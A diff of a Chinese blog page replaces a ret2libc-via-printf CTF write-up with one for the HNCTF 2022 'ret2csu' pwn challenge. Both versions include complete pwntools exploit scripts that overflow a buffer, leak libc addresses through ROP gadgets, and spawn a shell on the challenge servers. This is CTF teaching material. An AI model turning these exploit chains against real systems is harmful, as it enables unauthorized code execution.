@@ -9,7 +9,7 @@
     
     <title>
         
-            ret2libc-printf |
+            [HNCTF 2022 WEEK2]ret2csu |
         
         b1nary
     </title>
@@ -235,7 +235,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        ret2libc-printf
+                        [HNCTF 2022 WEEK2]ret2csu
                     </div>
                 
 
@@ -261,13 +261,13 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2025-07-20</span>
+                <span class="datetime">2025-09-08</span>
             </span>
 
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Wed Sep 03 2025 18:56:53 GMT+0800">2025-09-03</span>
+                    <span class="datetime" data-updated="Tue Sep 09 2025 13:24:30 GMT+0800">2025-09-09</span>
                 </span>
             
         
@@ -287,10 +287,10 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/ret2libc-printf/">ret2libc-printf</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
                         
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/stack/">stack</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/csu/">csu</a></li>
                         
                     
                 </ul>
@@ -315,114 +315,20 @@
                     
 
                     
-                         <h2 id="严格符合printf的格式"><a href="#严格符合printf的格式" class="headerlink" title="严格符合printf的格式"></a>严格符合printf的格式</h2><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2" >[HarekazeCTF2019]baby_rop2<i class="fas fa-external-link-alt"></i></a></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250720150231484.png"  alt="image-20250720150231484"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250720150244894.png"  alt="image-20250720150244894"></p>
-<p>而且函数中没有system函数和相应字符串</p>
-<p>要泄露libc的地址</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250720150404867.png"  alt="image-20250720150404867"></p>
-<p>通过read读取数据，用printf打印出来</p>
-<p><code>printf</code> 函数的 GOT 地址不能用来泄露 <code>printf</code> 自己的地址？</p>
-<p>是的，这是个<strong>鸡生蛋蛋生鸡</strong> 的问题：</p>
-<ul>
-<li><code>printf@got</code> 保存的是 <code>printf</code> 的真实地址（libc 中的地址）。</li>
-<li>但你要调用 <code>printf</code> 才能打印它，而调用 <code>printf</code> 又依赖 GOT 表项的地址。</li>
-<li>如果 GOT 表项还没解析（延迟绑定），它指向 PLT stub，不是真实地址。</li>
-<li>即使 GOT 表项已解析，你也无法通过 <code>printf(&quot;%s&quot;, printf_got)</code> 正确读取地址。</li>
-</ul>
-<p>🧠 总结对比</p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>puts(puts_got)</code></td>
-<td>✅ 可行</td>
-<td><code>puts</code>会尝试打印从<code>puts_got</code>开始的内容，libc 中有字符串，不会崩溃</td>
-</tr>
-<tr>
-<td><code>printf(&quot;%s&quot;, printf_got)</code></td>
-<td>❌ 不可行</td>
-<td><code>printf</code>会尝试从<code>printf_got</code>地址读取字符串，但那是个函数地址，不是字符串</td>
-</tr>
-<tr>
-<td><code>printf(&quot;%p&quot;, printf_got)</code></td>
-<td>✅ 可行（需构造）</td>
-<td>可以打印地址，但需要正确设置格式字符串</td>
-</tr>
-<tr>
-<td><code>printf(&quot;%s&quot;, read_got)</code></td>
-<td>✅ 可行（偶尔）</td>
-<td><code>read_got</code>指向的地址附近可能有字符串，可以打印出来</td>
-</tr>
-<tr>
-<td><code>puts(printf_got)</code></td>
-<td>✅ 可行（偶尔）</td>
-<td>同上，但依赖 libc 中的字符串</td>
-</tr>
-</tbody></table>
-<p>要调用printf函数进行泄露，就要根据其特性来传参，printf函数有两个参数，一个格式化字符串，一个可变参数列表</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250720151142483.png"  alt="image-20250720151142483"></p>
-<p>RDI、RSI、RDX、RCX、R8、R9参数按照这个顺序传入寄存器中</p>
-<p>有单独的rdi</p>
-<p>所以rdi&#x3D;0x400733</p>
-<p>但没有单独对rsi的处理</p>
-<p>所以rsi_r15&#x3D;0x400731，对r15随便传入一个数就可</p>
-<p>第一次payload的构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)</span><br><span class="line">payload+=p64(printf_plt)+p64(main_plt)</span><br><span class="line">p.recvuntil(b&quot;name? &quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read= u64(p.recvuntil(b&quot;\x7f&quot;)[-6:] + b&#x27;\0\0&#x27;)</span><br><span class="line"></span><br><span class="line">print(hex(read))</span><br></pre></td></tr></table></figure>
-
-
-
-<p>第二次通过计算出libc的基址，加上偏移量就得到了需要的函数的地址，就可与i进行构造了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<p>脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./babyrop2&#x27;)</span><br><span class="line">p = remote(&quot;node5.buuoj.cn&quot;,25235)</span><br><span class="line">elf = ELF(&#x27;./babyrop2&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000400733</span><br><span class="line">pop_rsi_r15 = 0x0000000000400731 </span><br><span class="line">format_str = 0x0000000000400770  </span><br><span class="line">ret_addr = 0x0000000000400734</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[&#x27;printf&#x27;]</span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">main_plt = 0x400636</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)</span><br><span class="line">payload+=p64(printf_plt)+p64(main_plt)</span><br><span class="line">p.recvuntil(b&quot;name? &quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read= u64(p.recvuntil(b&quot;\x7f&quot;)[-6:] + b&#x27;\0\0&#x27;)</span><br><span class="line"></span><br><span class="line">print(hex(read))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;read&#x27;, read)</span><br><span class="line">libc_base = read - libc.dump(&#x27;read&#x27;)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h2 id="单个函数"><a href="#单个函数" class="headerlink" title="单个函数"></a>单个函数</h2><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#pwn2_sctf_2016" >pwn2_sctf_2016<i class="fas fa-external-link-alt"></i></a></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250720164815201.png"  alt="image-20250720164815201"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250720164826945.png"  alt="image-20250720164826945"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250720164912004.png"  alt="image-20250720164912004"></p>
-<p>首先看到题目输入一个小于32的数，并把这个数当作get输入的最大限制</p>
-<p>所以可以输入一个负数来解决这个限制</p>
-<p>也是没有system函数的相关内容</p>
-<p>考虑泄露libc的地址</p>
-<p>:detective:用printf打印，可以用printf的got表、</p>
-<p>因为你调用了 <code>printf(printf_got)</code>。</p>
-<p>对于 <code>printf</code> 来说：</p>
-<ul>
-<li><p>它看不到这是一个整数地址</p>
-</li>
-<li><p>它只是把你给的指针当作一个<strong>字符串格式</strong>解析</p>
-</li>
-<li><p>如果你传入的这个地址是可读的内存，它就会按照那块内存的内容当作字符串去输出</p>
-<p>所以如果只是传一个参数，printf函数会刚好把它当作字符串</p>
-<p>刚好解决了传递它本身的got表地址，和只有一个参数的问题</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;a&#x27; * (0x2c+4) + p32(printf_plt) + p32(main) + p32(printf_got)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>之后就是标准流程</p>
-<p>就是记得返回地址是main函数</p>
-<p>要再次输入依次那个负数</p>
-<p>脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">from time import sleep</span><br><span class="line">r = remote(&quot;node5.buuoj.cn&quot;,28640)</span><br><span class="line">elf = ELF(&#x27;./pwn2_sctf_2016&#x27;)</span><br><span class="line">printf_plt = elf.plt[&#x27;printf&#x27;]</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">main= elf.sym[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">r.recvuntil(b&#x27;read?&#x27;)</span><br><span class="line">r.sendline(b&#x27;-1&#x27;)</span><br><span class="line">r.recvuntil(b&quot;data!\n&quot;)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * (0x2c+4)</span><br><span class="line">payload += p32(printf_plt) + p32(main) + p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">printf_addr=u32(r.recv(4))#接受</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)</span><br><span class="line"></span><br><span class="line">base = printf_addr - libc.dump(&#x27;printf&#x27;)</span><br><span class="line">system_addr = base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">r.recvuntil(b&#x27;How many bytes do you want me to read?&#x27;)</span><br><span class="line">r.sendline(b&#x27;-1&#x27;)</span><br><span class="line">r.recvuntil(b&quot;data!\n&quot;)</span><br><span class="line">payload = b&#x27;a&#x27; * (0x2c+4) + p32(system_addr) + p32(main) + p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-
+                         <p><a class="link"   target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2963" >题目<i class="fas fa-external-link-alt"></i></a></p>
+<p>分析</p>
+<p><img   src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20250908185528602.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250908185546519.png"  alt="image-20250908185546519"></p>
+<p>可以看到没有system函数，而且只能通过write去泄露，write有三个参数，但是pop指令不够</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250908183426355.png"  alt="image-20250908183426355"></p>
+<p>所以要用csu</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250908183500625.png"  alt="image-20250908183500625"></p>
+<p>整理一下思路</p>
+<p>先通过pop那一块操作把我们要的值放入对应的寄存器中，然后再调用mov函数去设置我们需要的寄存器，注意add rsp跳过一个位置，以及6个pop指令一共处理了56个字节，所以要填补上</p>
+<p>也就是说在执行完一次pop和mov操作之后会再次进入pop，要填充足够的字节rsp到达我们的ret地址处然后改变返回地址</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250909132236063.png"  alt="image-20250909132236063"></p>
+<p>所以</p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">file_path = &quot;./ret2csu&quot;</span><br><span class="line">remote_host = &quot;node5.anna.nssctf.cn&quot;</span><br><span class="line">remote_port = 20627</span><br><span class="line">libc=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">if &#x27;re&#x27; in sys.argv:</span><br><span class="line">    p = remote(remote_host, remote_port)</span><br><span class="line">else:</span><br><span class="line">    p = process(file_path)</span><br><span class="line">    #gdb.attach(p, &quot;b*0x04012D7&quot;)</span><br><span class="line"></span><br><span class="line">def sla(a, b):</span><br><span class="line">    p.sendlineafter(a, b)</span><br><span class="line">def sa(a,b):</span><br><span class="line">    p.sendafter(a,b)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">main= 0x4011DC</span><br><span class="line">rdi = 0x4012b3</span><br><span class="line">ret= 0x40101a</span><br><span class="line">pop6=0x4012AA</span><br><span class="line">mov=0x401290</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;Input:\n&quot;)</span><br><span class="line">payload = b&#x27;a&#x27;*0x108 + p64(pop6)</span><br><span class="line">payload += p64(0) + p64(1) + p64(1)</span><br><span class="line">payload += p64(write_got) + p64(8) + p64(write_got)</span><br><span class="line">payload += p64(mov) +b&quot;a&quot;*56+ p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;Ok.\n&quot;)</span><br><span class="line">write= u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&quot;write:&quot;,hex(write))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = write- libc.symbols[&#x27;write&#x27;]</span><br><span class="line">system_addr = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;a&#x27;*0X108+ p64(ret) + p64(rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">delimiter = &#x27;Input:\n&#x27;</span><br><span class="line">p.sendlineafter(delimiter, payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
                     
@@ -436,11 +342,11 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/ret2libc-printf/">ret2libc-printf</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
                                     </li>
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/stack/">stack</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/csu/">csu</a>
                                     </li>
                                 
                             </ul>
@@ -482,14 +388,14 @@
                             <div class="prev-post">
                                 <a class="prev"
                                    rel="prev"
-                                   href="/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"
-                                   title="格式化字符串"
+                                   href="/2025/09/09/odd-canary/"
+                                   title="odd_canary"
                                 >
                                     <span class="left arrow-icon flex-center">
                                         <i class="fas fa-chevron-left"></i>
                                     </span>
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">格式化字符串</span>
+                                        <span class="post-nav-title-item text-ellipsis">odd_canary</span>
                                         <span class="post-nav-item">Prev posts</span>
                                     </span>
                                 </a>
@@ -499,11 +405,11 @@
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2025/07/16/%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/"
-                                   title="gdb调试"
+                                   href="/2025/09/01/NSSRound-14-Basic-rbp/"
+                                   title="[NSSRound#14 Basic]rbp"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">gdb调试</span>
+                                        <span class="post-nav-title-item text-ellipsis">[NSSRound#14 Basic]rbp</span>
                                         <span class="post-nav-item">Next posts</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -531,7 +437,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%A5%E6%A0%BC%E7%AC%A6%E5%90%88printf%E7%9A%84%E6%A0%BC%E5%BC%8F"><span class="nav-text">严格符合printf的格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0"><span class="nav-text">单个函数</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-text">脚本</span></a></li></ol>
     </div>
 </div>
 
@@ -691,7 +597,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%A5%E6%A0%BC%E7%AC%A6%E5%90%88printf%E7%9A%84%E6%A0%BC%E5%BC%8F"><span class="nav-text">严格符合printf的格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0"><span class="nav-text">单个函数</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-text">脚本</span></a></li></ol>
     </div>
 </div>
 
